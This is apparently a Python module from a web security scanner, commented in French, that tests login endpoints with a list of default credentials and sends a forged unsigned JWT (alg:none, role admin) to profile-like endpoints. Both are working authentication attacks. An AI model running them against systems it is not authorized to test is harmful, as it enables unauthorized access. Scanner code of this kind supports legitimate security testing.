"""Authentification cassée : identifiants par défaut sur les endpoints de
login découverts, et JWT `alg:none` accepté par un endpoint protégé."""
from __future__ import annotations

import base64
import json

from ..scan_models import Finding
from ._util import iter_login_targets

DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
    ("administrator", "administrator"), ("root", "root"),
    ("test", "test"), ("guest", "guest"),
]

PROTECTED_HINTS = ("me", "profile", "whoami", "account", "user")


def t_default_credentials(ctx) -> list[Finding]:
    for action, _fields in iter_login_targets(ctx.sitemap):
        ref, _, _ = ctx.safe_post(action, data={"email": "nobody@nope.tld", "password": "x"})
        if ref in (-1, 404):
            continue
        for user, pwd in DEFAULT_CREDS:
            for uf in ("email", "username"):
                st, _, body = ctx.safe_post(action, data={uf: user, "password": pwd})
                low = (body or "").lower()
                if st == 200 and ("token" in low or "authentication" in low or "jwt" in low):
                    return [Finding("auth", "default-credentials", "high", action,
                                    f"Identifiants faibles acceptés : {user}/{pwd}",
                                    request=f"POST {action}")]
    return []


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def t_jwt_none_alg(ctx) -> list[Finding]:
    header = _b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    payload = _b64url(json.dumps({"data": {"email": "pentaster@none.tld"},
                                  "role": "admin", "iat": 0}).encode())
    token = f"{header}.{payload}."
    targets = [ep.url for ep in list(ctx.sitemap.endpoints) + list(ctx.sitemap.api_endpoints)]
    for url in targets:
        if not any(h in url.lower() for h in PROTECTED_HINTS):
            continue
        st, _, body = ctx.safe_get(url, headers={"Authorization": f"Bearer {token}",
                                                  "Cookie": f"token={token}"})
        if st == 200 and ("none.tld" in (body or "") or "email" in (body or "").lower()):
            return [Finding("auth", "jwt-none-algorithm", "high", url,
                            "Un JWT non signé (alg:none) a été accepté",
                            request=f"GET {url}")]
    return []


ATTACKS = [
    ("auth", "Default credentials", t_default_credentials),
    ("auth", "JWT alg:none", t_jwt_none_alg),
]
